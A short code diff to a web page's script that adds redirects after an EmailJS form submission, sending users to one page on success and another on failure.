@@ -155,8 +155,10 @@
             emailjs.sendForm('service_y8fwp38', 'template_c45abnw', this)
                 .then(function(response) {
                     alert('SUCCESS! Email sent.');
+                    window.location.href = './getback.html';
                 }, function(error) {
                     alert('FAILED... ' + JSON.stringify(error));
+                    window.location.href = './wrongdet.html';
                 });
         });
     </script>
